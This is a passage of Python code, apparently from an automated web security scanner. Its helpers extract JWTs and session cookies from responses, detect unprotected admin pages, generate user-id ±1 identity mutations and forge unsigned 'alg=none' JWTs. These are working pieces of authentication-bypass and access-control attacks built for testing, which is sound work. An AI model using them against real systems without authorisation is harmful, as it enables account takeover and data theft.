def _extract_token(outcome: dict) -> str:
    """JWT (preferred), token JSON keys, or session cookies — in that order."""
    body = outcome.get("body", "") or ""
    match = _JWT_RE.search(body)
    if match:
        return match.group(0)
    import json as _json
    try:
        data = _json.loads(body)
    except (ValueError, TypeError):
        data = {}
    if isinstance(data, dict):
        for key in ("token", "accessToken", "access_token", "idToken",
                    "jwt", "authToken", "sessionToken"):
            value = data.get(key)
            if isinstance(value, str) and len(value) > 20:
                return value
        auth = data.get("authentication", {})
        if isinstance(auth, dict):
            for key in ("token", "accessToken", "access_token"):
                value = auth.get(key)
                if isinstance(value, str) and len(value) > 20:
                    return value
    headers = str(outcome.get("headers", "") or "")
    match = re.search(r"set-cookie:\s*([^;\s]*session[^;\s]*=[^;\s]+)",
                      headers, re.I)
    if match:
        return "cookie:" + match.group(1)
    return ""


def _differs_from_baseline(outcome: dict, baseline_markers: set) -> bool:
    """A token/session/capability the failure baseline lacks."""
    if _extract_token(outcome):
        return True
    body = outcome.get("body", "") or ""
    lowered = body.lower()
    if any(marker in lowered for marker in
           ("dashboard", "welcome", "logout", "my account", "profile")):
        return baseline_markers and not any(
            marker in lowered for marker in baseline_markers)
    return False


def _is_admin_surface(response: dict, profile=None) -> bool:
    """200 + admin markers, not a login wall, not the site default.

    The profile gate matters: on a 200-everything SPA the admin URL
    answers 200 with the shell, and markers like "settings" appear in
    every bundled page. Without the catch-all check that is a finding
    on every route.
    """
    if response.get("status") != 200:
        return False
    body = response.get("body", "") or ""
    lowered = body.lower()
    if any(marker in lowered for marker in
           ("login", "sign in", "unauthorized", "unauthorised", "access denied")):
        return False
    markers = ("admin", "config", "application", "dashboard", "users",
               "settings")
    if sum(1 for marker in markers if marker in lowered) < 2:
        return False
    if profile is not None:
        from core.response_fingerprint import fingerprint as make_fingerprint
        if profile.baseline.catch_all(make_fingerprint(200, body)):
            return False
    return True


def _responses_match(first: dict, second: dict) -> bool:
    return first.get("status") == second.get("status") and \
        first.get("status") == 200 and \
        first.get("body", "") == second.get("body", "")


def _id_mutations(claims: dict) -> list:
    """Unsigned-forgery identity variants: numeric ids ±1, role swaps.

    Looks through wrapper claims ({"data": {...}}) as well as flat
    ones. Each entry is (label, mutated-claims-dict) ready to re-sign
    with alg=none.
    """
    scopes = []
    if isinstance(claims, dict):
        scopes.append(((), claims))
        nested = claims.get("data")
        if isinstance(nested, dict):
            scopes.append((("data",), nested))
    mutations = []
    for path, scope in scopes:
        for key in ("id", "userId", "user_id", "sub", "uid"):
            value = scope.get(key)
            number = _as_int(value)
            if number is None:
                continue
            for delta in (1, -1):
                mutated = _deep_copy(claims)
                target = mutated
                for step in path:
                    target = target[step]
                target[key] = number + delta
                where = ".".join([*path, key]) if path else key
                mutations.append((f"{where} {number}->{number + delta}",
                                  mutated))
                if len(mutations) >= 4:
                    return mutations
    return mutations


def _as_int(value) -> int | None:
    try:
        number = int(str(value))
    except (TypeError, ValueError):
        return None
    return number if number > 0 else None


def _deep_copy(obj):
    import copy
    return copy.deepcopy(obj)


def _owner_markers(body: str) -> set:
    """Identity-bearing strings in a response: emails and id fields."""
    import re as _re
    markers = set()
    for email in _re.findall(
            r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", body or ""):
        markers.add(email.lower())
    for match in _re.finditer(r'"(?:user_?id|email|owner_?id|account_?id)"\s*:\s*"?([^",}]+)"?', body or "", re.I):
        markers.add(match.group(1).strip().lower())
    for match in _re.finditer(r'"id"\s*:\s*(\d+)', body or ""):
        markers.add("id:" + match.group(1))
    return markers


def _none_alg_variant(token: str) -> str:
    """Unsigned forgery preserving the captured claims."""
    import base64 as _b64
    import json as _json
    parts = str(token).split(".")
    if len(parts) != 3:
        return token
    header = _b64.urlsafe_b64encode(
        _json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    return f"{header}.{parts[1]}."
